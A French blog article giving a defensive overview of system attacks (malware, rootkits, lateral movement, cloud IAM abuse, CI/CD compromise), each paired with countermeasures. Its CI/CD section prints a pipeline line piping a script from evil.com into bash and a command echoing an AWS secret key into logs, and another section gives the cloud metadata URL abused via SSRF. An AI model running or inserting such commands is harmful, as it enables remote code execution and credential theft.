---
title: "⚙️ Attaques sur les systèmes : comprendre et prévenir"
date: 2025-08-28
lastmod: 2025-08-28
description: "Panorama complet des attaques ciblant les systèmes (serveurs, cloud, conteneurs, CI/CD) et des contre-mesures efficaces pour renforcer la sécurité."
summary: "Des malwares aux attaques sur la chaîne CI/CD : découvrez les principales menaces qui visent le cœur des systèmes informatiques et les meilleures pratiques pour s’en protéger."
categories: ["Articles"]
tags: ["systèmes", "cybersécurité", "cloud", "DevSecOps", "CI/CD", "ransomware"]
author: "Jean-Vivien Sicot"
draft: false
showToc: true
tocOpen: false
cover:
  image: "images/articles/chat-cyberhacker-attaque-systeme.png"
  alt: "Illustration abstraite représentant la sécurité des systèmes"
  caption: "Panorama des attaques qui ciblent directement le cœur des systèmes informatiques."
---

# Attaques sur les systèmes

Les attaques sur les systèmes visent directement le cœur d’un environnement informatique : 
les postes utilisateurs, les serveurs, les conteneurs, le cloud et leurs mécanismes de gestion.  
Contrairement aux attaques purement réseau ou applicatives, elles ciblent l’**exécution** et 
le **fonctionnement interne** des machines, afin d’obtenir un contrôle durable, contourner les 
protections ou exploiter les ressources.

On y retrouve aussi bien des menaces “classiques” (malwares, ransomwares, rootkits) que des 
attaques plus avancées (persistance firmware, exploitation du noyau, abus d’IAM en cloud, 
compromission de pipelines CI/CD).  

Leur point commun : elles cherchent à s’installer dans la durée et à offrir à l’attaquant 
un levier puissant pour espionner, manipuler ou saboter l’infrastructure.  
C’est pourquoi la prévention repose à la fois sur le **durcissement technique** (patchs, 
segmentation, contrôle d’intégrité) et sur le **monitoring permanent** (EDR, détection 
comportementale, journaux centralisés).  

---

## 1. Malware (virus, ver, trojan)

### 1. Situation de départ
Un utilisateur télécharge une application gratuite (ex. lecteur vidéo cracké) sur un site douteux.

### 2. Ce que fait l’attaquant
- Le programme contient un code malveillant.  
- À l’installation, il s’exécute en arrière-plan : keylogger, botnet, vol de fichiers.

### 3. Conséquence
- Vol d’informations.  
- Machine utilisée comme relais d’attaque.  
- Dégradation des performances.

### 4. Pourquoi c’est possible
- L’utilisateur exécute un binaire sans vérifier sa provenance.  
- Pas de contrôle antivirus ou de sandbox.  

### 5. Contre-mesures

#### ✅ Antivirus / EDR
- Analyse les signatures et comportements.  
- **Pourquoi ça protège** : détecte et bloque le code malveillant avant exécution.

#### ✅ Signatures numériques
- Vérifier que le logiciel est signé par l’éditeur.  
- **Pourquoi ça protège** : un malware non signé est suspect et rejeté.

#### ✅ Principe du moindre privilège
- L’utilisateur n’est pas administrateur.  
- **Pourquoi ça protège** : limite l’impact du malware (pas de modifications système critiques).

---

## 2. Ransomware

### 1. Situation de départ
Un employé ouvre une pièce jointe piégée reçue par email.

### 2. Ce que fait l’attaquant
- Le programme chiffre tous les fichiers locaux et réseau.  
- Un message s’affiche : “Payez 5000€ en Bitcoin pour récupérer vos données”.

### 3. Conséquence
- Perte d’accès aux fichiers.  
- Blocage complet de l’activité.  

### 4. Pourquoi c’est possible
- L’utilisateur exécute un fichier non vérifié.  
- Pas de segmentation réseau → le malware chiffre aussi les partages.  
- Pas de sauvegarde récente.  

### 5. Contre-mesures

#### ✅ Sauvegardes hors ligne
- Conserver une copie déconnectée (offline ou immutable).  
- **Pourquoi ça protège** : restauration possible même si les systèmes sont chiffrés.

#### ✅ Segmentation réseau
- Limiter les partages entre postes.  
- **Pourquoi ça protège** : empêche la propagation à toute l’entreprise.

#### ✅ EDR (Endpoint Detection & Response)
- Surveille les comportements suspects (ex. chiffrement massif).  
- **Pourquoi ça protège** : stoppe le processus avant qu’il n’infecte tout.

---

## 33. Rootkit

### 1. Situation de départ
Un serveur est compromis via une vulnérabilité logicielle.

### 2. Ce que fait l’attaquant
- Il installe un rootkit qui modifie le noyau ou les processus système.  
- Le rootkit cache sa présence (fichiers, processus, connexions).

### 3. Conséquence
- L’attaquant garde un accès discret et persistant.  
- Détection très difficile.  

### 4. Pourquoi c’est possible
- Droits administrateur/root obtenus via une faille.  
- Pas de contrôle d’intégrité du système.  

### 5. Contre-mesures

#### ✅ Secure Boot + TPM
- Vérifie l’intégrité du noyau au démarrage.  
- **Pourquoi ça protège** : empêche le chargement d’un kernel modifié.

#### ✅ Outils de détection d’anomalies
- Comparer les résultats d’API système avec un scan brut.  
- **Pourquoi ça protège** : révèle les processus/fichiers cachés.

#### ✅ Réinstallation propre
- En cas d’infection, reconstruire le système depuis zéro.  
- **Pourquoi ça protège** : élimine totalement le rootkit.  

---

## 4. Escalade de privilèges

### 1. Situation de départ
Un utilisateur compromis a un compte avec droits limités sur un serveur.

### 2. Ce que fait l’attaquant
- Il exploite une faille (ex. SUID binaire mal configuré, bug kernel).  
- Il obtient des droits administrateur.  

### 3. Conséquence
- Accès complet au système.  
- Désactivation des protections de sécurité.  

### 4. Pourquoi c’est possible
- Mauvaise configuration (droits trop élevés).  
- Failles non corrigées dans le noyau ou les logiciels.  

### 5. Contre-mesures

#### ✅ Patching régulier
- Mettre à jour kernel et logiciels.  
- **Pourquoi ça protège** : supprime les vulnérabilités connues.

#### ✅ Principe du moindre privilège
- Limiter les droits des utilisateurs et services.  
- **Pourquoi ça protège** : réduit l’impact d’un compte compromis.

#### ✅ Monitoring et alerte
- Surveiller les tentatives d’utilisation d’outils d’escalade.  
- **Pourquoi ça protège** : détection rapide avant compromission totale.  

---

## 5. Backdoors

### 1. Situation de départ
Un serveur est piraté et nettoyé superficiellement.

### 2. Ce que fait l’attaquant
- Il installe une porte dérobée (script webshell, compte caché).  
- Même après restauration apparente, il garde un accès.

### 3. Conséquence
- Compromission persistante.  
- Reprise de contrôle après nettoyage.  

### 4. Pourquoi c’est possible
- L’attaquant laisse un accès discret.  
- Les administrateurs ne vérifient pas l’intégrité complète du système.  

### 5. Contre-mesures

#### ✅ Vérification d’intégrité
- Utiliser des hash/signatures sur les fichiers systèmes.  
- **Pourquoi ça protège** : détecte les modifications non autorisées.

#### ✅ Réinstallation totale
- En cas de doute, reconstruire le système depuis une image propre.  
- **Pourquoi ça protège** : supprime toute backdoor cachée.

#### ✅ Segmentation et logs centralisés
- Centraliser l’authentification et la journalisation.  
- **Pourquoi ça protège** : un compte caché local se voit vite dans les logs.  

---

## 6. Supply Chain Attack (chaîne d’approvisionnement)

### 1. Situation de départ
Une entreprise télécharge une bibliothèque open source pour son application.

### 2. Ce que fait l’attaquant
- Il compromet le dépôt officiel ou publie une version corrompue.  
- L’entreprise intègre le code malveillant sans s’en rendre compte.  

### 3. Conséquence
- Espionnage des utilisateurs finaux.  
- Vol de données sensibles via une dépendance tierce.  

### 4. Pourquoi c’est possible
- Confiance aveugle dans les librairies externes.  
- Absence de contrôle d’intégrité ou d’audit.  

### 5. Contre-mesures

#### ✅ Vérification de l’intégrité
- Hashes, signatures GPG des packages.  
- **Pourquoi ça protège** : détecte une bibliothèque modifiée.

#### ✅ Dépendances vérifiées
- Auditer régulièrement les bibliothèques.  
- **Pourquoi ça protège** : réduit le risque d’utiliser du code compromis.

#### ✅ SBOM (Software Bill of Materials)
- Maintenir une liste complète des dépendances.  
- **Pourquoi ça protège** : permet de réagir vite en cas de compromission d’un composant.  


## 7. Variantes de Ransomware

### 1. Situation de départ
Un employé reçoit une pièce jointe piégée et l’ouvre.  
Le malware s’exécute sur son poste.

### 2. Ce que fait l’attaquant
- **Crypto-ransomware** : chiffre les fichiers et exige une rançon.  
- **Locker ransomware** : verrouille totalement l’écran (accès bloqué).  
- **Leakware** : vole les fichiers avant de les chiffrer → menace de les publier.  

### 3. Conséquence
- Perte d’accès aux fichiers.  
- Risque de fuite publique des données sensibles.  

### 4. Pourquoi c’est possible
- Pas de filtrage des pièces jointes.  
- Pas de sauvegarde déconnectée.  
- Droits trop élevés de l’utilisateur.  

### 5. Contre-mesures

#### ✅ Segmentation des droits
- L’utilisateur ne doit pas avoir accès à tous les partages réseau.  
- **Pourquoi ça protège** : limite la propagation du chiffrement.  

#### ✅ Backups immuables
- Sauvegardes chiffrées et en lecture seule.  
- **Pourquoi ça protège** : empêche l’attaquant de supprimer aussi les backups.  

#### ✅ Détection comportementale
- Bloquer un processus qui ouvre et chiffre rapidement un grand nombre de fichiers.  
- **Pourquoi ça protège** : arrête l’infection en cours d’exécution.  

---

## 8. Persistence (mécanismes de survie)

### 1. Situation de départ
Un attaquant a compromis un poste ou serveur.  

### 2. Ce que fait l’attaquant
- Installe un **service Windows** ou tâche planifiée.  
- Ajoute une clé dans le registre (`Run`, `RunOnce`).  
- Modifie un script de démarrage Linux (`.bashrc`, `systemd`).  

### 3. Conséquence
- Le malware se relance après chaque redémarrage.  
- L’attaquant garde un accès long terme.  

### 4. Pourquoi c’est possible
- Systèmes configurés pour exécuter automatiquement des scripts au boot.  
- Manque de surveillance sur les services planifiés.  

### 5. Contre-mesures

#### ✅ Monitoring de l’autostart
- Surveiller les registres Windows, tâches cron/systemd.  
- **Pourquoi ça protège** : détecte toute entrée suspecte qui garantit la persistance.  

#### ✅ EDR avec règles YARA
- Détecte les modifications typiques de persistance.  
- **Pourquoi ça protège** : alerte si un nouveau service/tâche anormal est ajouté.  

#### ✅ Golden image de référence
- Comparer l’état du système avec une version propre.  
- **Pourquoi ça protège** : identifie toute persistance introduite par l’attaquant.  

---

## 9. Living-off-the-Land (LotL)

### 1. Situation de départ
Un attaquant a un accès limité à un serveur Windows ou Linux.

### 2. Ce que fait l’attaquant
- Utilise des outils natifs comme `PowerShell`, `WMI`, `certutil.exe`, `bash`, `curl`.  
- Pas besoin de malware externe → moins détectable.  

### 3. Conséquence
- Extraction de données.  
- Déploiement de backdoors.  
- Mouvement latéral entre machines.  

### 4. Pourquoi c’est possible
- Les outils légitimes sont présents par défaut.  
- Les antivirus ne bloquent pas leur usage normal.  

### 5. Contre-mesures

#### ✅ Restriction d’usage des outils
- Désactiver ou limiter PowerShell, WMI si inutiles.  
- **Pourquoi ça protège** : réduit la surface d’attaque disponible.  

#### ✅ Logging renforcé
- Activer logs détaillés PowerShell (Script Block Logging).  
- **Pourquoi ça protège** : permet d’identifier l’usage détourné des outils natifs.  

#### ✅ EDR avec détection comportementale
- Repérer l’usage suspect d’outils système (ex. `certutil` téléchargeant un binaire).  
- **Pourquoi ça protège** : bloque les abus sans bloquer les usages normaux.  

---

## 10. Mouvement latéral

### 1. Situation de départ
Un attaquant a compromis un poste utilisateur via phishing.

### 2. Ce que fait l’attaquant
- Récupère les **hashs de mots de passe** ou **tickets Kerberos**.  
- Utilise **Pass-the-Hash** ou **Pass-the-Ticket** pour se connecter à d’autres machines.  
- Explore le réseau jusqu’aux serveurs critiques (AD, bases de données).  

### 3. Conséquence
- Compromission d’un poste → compromission de tout le domaine.  
- Accès aux comptes administrateurs.  

### 4. Pourquoi c’est possible
- Les identifiants circulent sur le réseau (SSO, sessions ouvertes).  
- Pas de segmentation réseau ni d’authentification multi-facteur.  

### 5. Contre-mesures

#### ✅ Segmentation réseau
- Isoler les machines critiques des postes utilisateurs.  
- **Pourquoi ça protège** : empêche un simple poste compromis d’atteindre tout le réseau.  

#### ✅ MFA pour les comptes admins
- Authentification forte pour toutes connexions distantes.  
- **Pourquoi ça protège** : même avec un hash volé, l’attaquant ne peut pas se connecter.  

#### ✅ Monitoring Kerberos/NTLM
- Détecter Pass-the-Hash/Pass-the-Ticket (anomalies d’authentification).  
- **Pourquoi ça protège** : alerte dès les premiers mouvements latéraux.  

---

## 11. Exploitation des ressources (Crypto-jacking)

### 1. Situation de départ
Un serveur web mal configuré ou vulnérable est compromis.

### 2. Ce que fait l’attaquant
- Installe un mineur de cryptomonnaie (Monero, etc.).  
- Utilise le CPU/GPU du serveur en arrière-plan.  

### 3. Conséquence
- Dégradation des performances.  
- Factures d’électricité ou cloud qui explosent.  

### 4. Pourquoi c’est possible
- Vulnérabilités non corrigées.  
- Pas de monitoring des performances anormales.  

### 5. Contre-mesures

#### ✅ Patch management
- Mettre à jour logiciels et services.  
- **Pourquoi ça protège** : ferme les failles utilisées pour installer le mineur.  

#### ✅ Monitoring des ressources
- Surveiller CPU/GPU, usage anormal.  
- **Pourquoi ça protège** : détecte rapidement une activité de minage.  

#### ✅ Limiter les privilèges
- Le serveur web ne doit pas avoir accès root.  
- **Pourquoi ça protège** : réduit la possibilité d’installer un mineur système.  

---

## 12. Fileless Malware (malware sans fichier)

### 1. Situation de départ
Un utilisateur clique sur un lien piégé dans un email.

### 2. Ce que fait l’attaquant
- Au lieu d’installer un fichier, le code malveillant s’exécute directement en mémoire (via PowerShell, WMI).  
- Il ne laisse aucune trace sur le disque.  

### 3. Conséquence
- Difficulté à détecter par antivirus classiques.  
- Contrôle furtif du système.  

### 4. Pourquoi c’est possible
- Les outils natifs permettent d’exécuter du code en mémoire.  
- Pas de surveillance renforcée de ces outils.  

### 5. Contre-mesures

#### ✅ EDR basé sur comportement
- Détecte des anomalies mémoire (scripts PowerShell suspects).  
- **Pourquoi ça protège** : alerte même sans fichier présent.  

#### ✅ Désactiver macros et exécutions automatiques
- Ne pas autoriser l’exécution de scripts par défaut.  
- **Pourquoi ça protège** : supprime le vecteur principal.  

#### ✅ Segmentation des privilèges
- Un utilisateur compromis ne doit pas avoir de droits admin.  
- **Pourquoi ça protège** : limite la portée du malware en mémoire.  

---

## 13. Credential Dumping (vol d’identifiants en mémoire)

### 1. Situation de départ
Un attaquant a compromis une machine Windows avec un compte utilisateur standard.

### 2. Ce que fait l’attaquant
- Utilise des outils comme **Mimikatz** pour lire la mémoire LSASS.  
- Récupère mots de passe en clair, hash NTLM, tickets Kerberos.  

### 3. Conséquence
- Vol d’identifiants d’utilisateurs et d’admins.  
- Mouvement latéral dans le réseau.  

### 4. Pourquoi c’est possible
- Windows stocke temporairement les secrets en mémoire.  
- Pas de protection renforcée du processus LSASS.  

### 5. Contre-mesures

#### ✅ Credential Guard (Windows)
- Isole les secrets LSASS dans une machine virtuelle protégée.  
- **Pourquoi ça protège** : empêche leur extraction par un processus compromis.  

#### ✅ Limitation des comptes admins
- Pas de sessions administrateurs sur les postes utilisateurs.  
- **Pourquoi ça protège** : même si compromis, pas d’identifiants sensibles présents en mémoire.  

#### ✅ EDR
- Détecte l’usage d’outils comme Mimikatz.  
- **Pourquoi ça protège** : alerte immédiatement sur un dump de mémoire suspect.  

---

## 14. Attaques contre Active Directory (AD)

### 1. Situation de départ
Une entreprise utilise AD pour gérer ses comptes et droits.

### 2. Ce que fait l’attaquant
- Exploite des comptes privilégiés.  
- Utilise **Golden Ticket** (faux ticket Kerberos avec clé du domaine).  
- Peut s’attribuer des droits d’admin à vie.  

### 3. Conséquence
- Compromission totale du domaine.  
- Contrôle permanent des machines jointes à l’AD.  

### 4. Pourquoi c’est possible
- Comptes admins mal protégés.  
- Clé Kerberos (KRBTGT) compromise.  

### 5. Contre-mesures

#### ✅ Rotation régulière de KRBTGT
- Régénérer la clé de signature Kerberos.  
- **Pourquoi ça protège** : invalide les Golden Tickets générés.  

#### ✅ Tiering des accès
- Séparer les comptes admin, user, et service.  
- **Pourquoi ça protège** : réduit la surface d’attaque.  

#### ✅ Monitoring AD
- Détecter anomalies d’authentification Kerberos.  
- **Pourquoi ça protège** : identifie des tickets suspects (longue durée, anomalies).  

---

## 15. Kernel Exploits (exploitation du noyau)

### 1. Situation de départ
Un attaquant a un accès limité à une machine Linux/Windows.

### 2. Ce que fait l’attaquant
- Exploite une vulnérabilité kernel (buffer overflow, use-after-free).  
- Exécute du code en mode kernel.  

### 3. Conséquence
- Escalade de privilèges → root/system.  
- Désactivation des protections de sécurité.  

### 4. Pourquoi c’est possible
- Kernel non patché.  
- Vulnérabilités logicielles non corrigées.  

### 5. Contre-mesures

#### ✅ Patch management
- Mettre à jour rapidement kernel et drivers.  
- **Pourquoi ça protège** : ferme les failles exploitables.  

#### ✅ ASLR + DEP
- Randomisation et protection mémoire activées.  
- **Pourquoi ça protège** : complique l’exploitation du bug.  

#### ✅ Sandbox / VM
- Isoler les applications à risque.  
- **Pourquoi ça protège** : limite l’accès au kernel.  

---

## 16. Persistence firmware / UEFI

### 1. Situation de départ
Un attaquant a compromis une machine critique et veut garder un accès permanent.

### 2. Ce que fait l’attaquant
- Modifie le firmware UEFI ou BIOS.  
- Installe un rootkit bas-niveau invisible aux antivirus.  

### 3. Conséquence
- Persistance même après réinstallation du système.  
- Contrôle total à chaque boot.  

### 4. Pourquoi c’est possible
- Firmware non signé ou non vérifié.  
- Pas de Secure Boot activé.  

### 5. Contre-mesures

#### ✅ Secure Boot
- Vérifie la signature du firmware et du bootloader.  
- **Pourquoi ça protège** : empêche l’exécution d’un firmware modifié.  

#### ✅ TPM (Trusted Platform Module)
- Stocke une empreinte cryptographique du boot.  
- **Pourquoi ça protège** : alerte si le firmware a changé.  

#### ✅ Firmware updates sécurisés
- Installer les mises à jour des constructeurs.  
- **Pourquoi ça protège** : corrige les failles UEFI/BIOS.  

---

## 17. Attaques via services exposés (RDP, SSH, SMB)

### 1. Situation de départ
Une entreprise expose son RDP (Remote Desktop) directement sur Internet.

### 2. Ce que fait l’attaquant
- Lance un bruteforce ou exploite une vulnérabilité (ex. BlueKeep).  
- Obtient un accès distant complet.  

### 3. Conséquence
- Prise de contrôle du serveur.  
- Déploiement de malwares/ransomware.  

### 4. Pourquoi c’est possible
- Services critiques exposés directement.  
- Pas de filtrage ni MFA.  

### 5. Contre-mesures

#### ✅ Pas d’exposition directe
- Passer par un VPN ou un bastion.  
- **Pourquoi ça protège** : seuls les utilisateurs légitimes peuvent atteindre RDP/SSH.  

#### ✅ MFA obligatoire
- Ajouter un facteur d’authentification pour chaque session distante.  
- **Pourquoi ça protège** : même si mot de passe volé, accès bloqué.  

#### ✅ Filtrage IP et honeypots
- Limiter les IP autorisées, surveiller les tentatives suspectes.  
- **Pourquoi ça protège** : réduit la surface et alerte sur les attaques.  

---

## 18. Keylogging

### 1. Situation de départ
Un utilisateur installe un programme gratuit sans vérification.

### 2. Ce que fait l’attaquant
- Le logiciel installe un keylogger en arrière-plan.  
- Il enregistre toutes les frappes clavier.  

### 3. Conséquence
- Vol de mots de passe.  
- Récupération de conversations privées.  

### 4. Pourquoi c’est possible
- L’utilisateur exécute du code non vérifié.  
- Pas d’antivirus ou sandbox.  

### 5. Contre-mesures

#### ✅ Antivirus/EDR
- Détecte les comportements de keylogging.  
- **Pourquoi ça protège** : bloque la capture des frappes.  

#### ✅ Virtual Keyboard / MFA
- Utiliser claviers virtuels pour les mots de passe critiques.  
- **Pourquoi ça protège** : rend plus difficile la capture d’identifiants sensibles.  

#### ✅ Moindre privilège
- Le keylogger ne doit pas pouvoir s’installer sans admin.  
- **Pourquoi ça protège** : réduit les risques d’installation furtive.  

---

## 19. VM Escape (évasion de machine virtuelle)

### 1. Situation de départ
Une entreprise utilise un hyperviseur (VMware, Hyper-V, KVM) pour héberger plusieurs VM.  
Chaque VM est censée être isolée.

### 2. Ce que fait l’attaquant
- Il exploite une vulnérabilité de l’hyperviseur (ex. bug dans la gestion mémoire).  
- Il sort de sa VM et obtient un accès à l’hôte physique.  
- De là, il peut attaquer les autres VM.

### 3. Conséquence
- Compromission de plusieurs serveurs clients.  
- Perte totale de l’isolation entre locataires.  

### 4. Pourquoi c’est possible
- L’hyperviseur est un logiciel complexe, donc vulnérable.  
- Les failles critiques (ex. VMware Escape, Xen Escape) existent régulièrement.  

### 5. Contre-mesures

#### ✅ Patch hyperviseur rapidement
- Appliquer les correctifs de sécurité dès leur sortie.  
- **Pourquoi ça protège** : ferme les failles connues avant exploitation.  

#### ✅ Isolation stricte des workloads
- Séparer les environnements sensibles (prod/test) sur des hyperviseurs différents.  
- **Pourquoi ça protège** : limite l’impact si une VM s’évade.  

#### ✅ Monitoring hôte/VM
- Surveiller les anomalies dans la communication VM ↔ hyperviseur.  
- **Pourquoi ça protège** : détecte une tentative d’évasion.  

---

## 20. Container Breakout (évasion de conteneur)

### 1. Situation de départ
Une application est déployée dans un conteneur Docker/Kubernetes.  
Le conteneur est censé être isolé de l’hôte.

### 2. Ce que fait l’attaquant
- Exploite une vulnérabilité du runtime (Docker, containerd).  
- Ou abuse de privilèges trop élevés (`--privileged`, montages `/var/run/docker.sock`).  
- Il sort du conteneur et accède à l’hôte.  

### 3. Conséquence
- Contrôle de l’hôte Kubernetes ou Docker.  
- Compromission de tous les autres conteneurs.  

### 4. Pourquoi c’est possible
- Isolation basée sur namespaces Linux, pas aussi forte qu’une VM.  
- Mauvaises configurations (conteneurs root, privilèges trop ouverts).  

### 5. Contre-mesures

#### ✅ Principe du moindre privilège
- Ne jamais lancer un conteneur en root.  
- **Pourquoi ça protège** : réduit l’impact en cas de compromission.  

#### ✅ Politiques PodSecurity / AppArmor / SELinux
- Limiter les capacités Linux utilisables par un conteneur.  
- **Pourquoi ça protège** : empêche d’accéder à des ressources critiques de l’hôte.  

#### ✅ Sécurité du runtime
- Surveiller les appels système (seccomp).  
- **Pourquoi ça protège** : bloque des comportements anormaux (ex. chargement de modules noyau).  

---

## 21. IAM Abuse (abus des rôles et permissions)

### 1. Situation de départ
Une entreprise utilise AWS, Azure ou GCP.  
Les comptes IAM (Identity & Access Management) attribuent les droits aux services et utilisateurs.

### 2. Ce que fait l’attaquant
- Il obtient une clé API exposée (dans GitHub, logs, image Docker).  
- La clé a des droits trop élevés (ex. admin global).  
- Il accède à tout l’environnement cloud.  

### 3. Conséquence
- Suppression ou vol de ressources.  
- Déploiement de backdoors (nouveaux comptes IAM).  
- Extraction de données sensibles (S3, buckets, blobs).  

### 4. Pourquoi c’est possible
- Mauvaise gestion des permissions (“* admin partout”).  
- Absence de rotation ou de protection des clés API.  

### 5. Contre-mesures

#### ✅ Principe du moindre privilège (IAM)
- Attribuer uniquement les droits nécessaires.  
- **Pourquoi ça protège** : limite l’impact d’une clé compromise.  

#### ✅ Rotation et audit des clés
- Changer régulièrement les clés IAM, activer MFA.  
- **Pourquoi ça protège** : réduit la durée d’exploitation d’une fuite.  

#### ✅ Détection d’anomalies IAM
- Activer GuardDuty (AWS), Defender (Azure).  
- **Pourquoi ça protège** : alerte en cas d’usage anormal d’une clé.  

---

## 22. Secrets dans Metadata Services

### 1. Situation de départ
Une application dans le cloud (AWS EC2, GCP Compute) peut interroger l’URL interne :  
`http://169.254.169.254/latest/meta-data/`  
→ qui contient des tokens IAM.

### 2. Ce que fait l’attaquant
- Il trouve une vulnérabilité SSRF sur l’app.  
- Il force l’application à requêter l’URL metadata.  
- Il récupère les tokens IAM temporaires.  

### 3. Conséquence
- L’attaquant obtient des accès cloud avec les permissions de l’instance.  
- Peut voler, supprimer ou modifier des ressources.  

### 4. Pourquoi c’est possible
- Les metadata services sont accessibles depuis toute l’instance.  
- Pas de restriction par défaut.  

### 5. Contre-mesures

#### ✅ IMDSv2 (AWS) ou équivalents
- Exige des requêtes signées et authentifiées.  
- **Pourquoi ça protège** : empêche l’exploitation via SSRF simple.  

#### ✅ Limiter les rôles IAM attachés aux VM
- Donner uniquement les droits strictement nécessaires.  
- **Pourquoi ça protège** : même si le token est volé, l’impact est réduit.  

#### ✅ Firewalls locaux
- Bloquer l’accès direct aux adresses metadata.  
- **Pourquoi ça protège** : même avec SSRF, pas d’accès au service de métadonnées.  

---

## 23. Misconfiguration Storage (S3 buckets, Azure blobs)

### 1. Situation de départ
Une équipe utilise un bucket S3 pour stocker des documents internes.  
Il est mal configuré : “public read”.

### 2. Ce que fait l’attaquant
- Il scanne Internet à la recherche de buckets ouverts.  
- Il télécharge les documents (factures, backups, données clients).  

### 3. Conséquence
- Exposition massive de données sensibles.  
- Risque RGPD, réputation.  

### 4. Pourquoi c’est possible
- Configuration par défaut permissive.  
- Manque de revue de configuration sécurité.  

### 5. Contre-mesures

#### ✅ Block Public Access (AWS) / équivalents
- Forcer tous les buckets à rester privés sauf exception.  
- **Pourquoi ça protège** : empêche l’exposition accidentelle.  

#### ✅ Policies IAM précises
- Autoriser uniquement des utilisateurs/roles définis.  
- **Pourquoi ça protège** : contrôle fin des accès aux ressources.  

#### ✅ Audit automatisé
- Outils comme AWS Config, GCP Security Scanner.  
- **Pourquoi ça protège** : détecte immédiatement un bucket exposé.  

---

## 24. Compromission de pipeline CI/CD

### 1. Situation de départ
Une entreprise utilise GitLab CI pour déployer automatiquement son application en production.  
Le pipeline utilise des scripts stockés dans `.gitlab-ci.yml`.

### 2. Ce que fait l’attaquant
- Il pousse un commit malveillant modifiant le pipeline :  
```yaml
script:
  curl http://evil.com/malware.sh | bash
```

- Le pipeline exécute le code malveillant avec les droits du runner.

### 3. Conséquence

- Déploiement d’un backdoor en production.
- Compromission des serveurs de build.

### 4. Pourquoi c’est possible

- Pas de revue de code obligatoire sur les fichiers de configuration CI/CD.
- Les runners ont accès à des secrets (API keys, credentials).

### 5. Contre-mesures

#### ✅ Revue obligatoire des pipelines

- Les modifications CI/CD doivent être validées par plusieurs reviewers.
- **Pourquoi ça protège** : empêche qu’un attaquant injecte du code sans contrôle.

#### ✅ Isolation des runners

- Runners CI/CD dédiés, avec peu de privilèges.
- **Pourquoi ça protège** : même si compromis, l’impact est limité.

#### ✅ Rotation des secrets

- Les secrets utilisés par les pipelines doivent être éphémères.
- **Pourquoi ça protège** : un secret volé ne reste pas exploitable longtemps.

---

## 25. Vol de secrets dans le pipeline

### 1. Situation de départ

Un pipeline CI/CD stocke des clés API et mots de passe dans des variables d’environnement.

### 2. Ce que fait l’attaquant

- Il modifie le script du pipeline pour afficher les variables : ```bash
	echo $AWS_SECRET_KEY```
- Les secrets apparaissent dans les logs.


### 3. Conséquence

- Vol de clés cloud / credentials internes.
- Exploitation de l’infrastructure externe (AWS, Azure, GitHub).

### 4. Pourquoi c’est possible

- Secrets stockés en clair dans les environnements CI/CD.
- Logs accessibles aux développeurs.

### 5. Contre-mesures

#### ✅ Gestion sécurisée des secrets

- Utiliser un coffre-fort (Vault, AWS Secrets Manager).
- **Pourquoi ça protège** : les secrets ne sont jamais exposés en clair.

#### ✅ Masquage des variables

- Configurer le CI/CD pour ne pas afficher les secrets dans les logs.
- **Pourquoi ça protège** : évite leur fuite par erreur.

#### ✅ Rotation régulière

- Les clés doivent expirer automatiquement.
- **Pourquoi ça protège** : limite la durée d’exploitation d’un secret compromis.

---

## 26. Compromission de registres d’images (Docker Registry)

### 1. Situation de départ

L’entreprise stocke ses images Docker dans un registre privé (Harbor, ECR, GitHub Container Registry).

### 2. Ce que fait l’attaquant

- Il obtient un accès au registre (via credentials volés).
- Il pousse une image malveillante avec un tag légitime (`latest`).
- Les développeurs la déploient sans s’en douter.

### 3. Conséquence

- Backdoor dans tous les conteneurs déployés.
- Espionnage ou exfiltration de données.

### 4. Pourquoi c’est possible

- Pas de contrôle d’intégrité des images.
- Pas de signature ni vérification cryptographique.

### 5. Contre-mesures

#### ✅ Signature des images (Docker Content Trust / Notary / Cosign)

- Les images sont signées avec une clé privée.
- **Pourquoi ça protège** : impossible de substituer une image sans casser la signature.

#### ✅ Scanning des images

- Vérification automatique des vulnérabilités (Trivy, Clair).
- **Pourquoi ça protège** : réduit le risque d’exploiter une image corrompue.

#### ✅ Contrôle d’accès strict

- Accès en écriture limité au registre.
- **Pourquoi ça protège** : empêche l’injection malveillante.

---

## 27. Injection de dépendances (Dependency Confusion)

### 1. Situation de départ

L’entreprise a des packages internes (ex. `mypackage-internal`) utilisés dans ses builds Node.js ou Python.

### 2. Ce que fait l’attaquant

- Il publie un package du même nom sur le registre public (npm, PyPI).
- Le gestionnaire de dépendances télécharge celui du public au lieu de l’interne.

### 3. Conséquence

- Exécution de code malveillant lors de l’installation.
- Vol de secrets depuis les pipelines CI/CD.

### 4. Pourquoi c’est possible

- Les gestionnaires privilégient parfois les dépôts publics.
- Pas de contrôle explicite de la source.

### 5. Contre-mesures

#### ✅ Verrouillage des sources

- Configurer le projet pour n’utiliser que le registre interne.
- **Pourquoi ça protège** : évite d’aller chercher un package externe par erreur.

#### ✅ Pinning des versions

- Définir explicitement la version et la source du package.
- **Pourquoi ça protège** : empêche l’installation d’une version malveillante.

#### ✅ Surveillance des noms de packages

- Détecter si un package interne apparaît sur un dépôt public.
- **Pourquoi ça protège** : alerte immédiatement sur une tentative de dependency confusion.

---

## 28. Attaques sur les runners CI/CD (Jenkins, GitLab, GitHub Actions)

### 1. Situation de départ

Une entreprise utilise des runners CI/CD partagés (multi-projets).

### 2. Ce que fait l’attaquant

- Il lance un job malveillant sur un runner.
- Il accède aux caches, workspaces ou credentials utilisés par d’autres jobs.

### 3. Conséquence

- Vol de secrets d’autres projets.
- Compromission des artefacts de build.

### 4. Pourquoi c’est possible

- Runners partagés entre plusieurs projets/équipes.
- Isolation insuffisante (même utilisateur système, même VM).

### 5. Contre-mesures

#### ✅ Isolation des runners

- Utiliser un runner dédié par projet ou équipe.
- **Pourquoi ça protège** : empêche les fuites inter-projets.

#### ✅ Conteneurisation des jobs

- Chaque build doit s’exécuter dans un conteneur jetable.
- **Pourquoi ça protège** : réduit les contaminations entre jobs.

#### ✅ Nettoyage automatique

- Effacer caches et artefacts après chaque build.
- **Pourquoi ça protège** : empêche un attaquant de réutiliser des restes d’exécution.

---

# Conclusion

Les attaques sur les systèmes représentent une des menaces les plus critiques, car elles visent 
le socle même de l’infrastructure : postes, serveurs, cloud, conteneurs.  
Elles vont de techniques très visibles (malwares, ransomwares) à des approches beaucoup plus 
furtives (rootkits, fileless malware, persistance firmware).  

Leur gravité vient du fait qu’une fois le système compromis, **toutes les couches supérieures** 
(applications, données, identités) deviennent accessibles à l’attaquant.  

Trois grands axes se dégagent :

- **Persistance** → l’attaquant cherche à rester invisible le plus longtemps possible.  
- **Escalade** → un compte limité devient un accès administrateur complet.  
- **Chaîne d’approvisionnement** → un seul point faible (dépendance, pipeline CI/CD) peut 
  compromettre des milliers de systèmes.

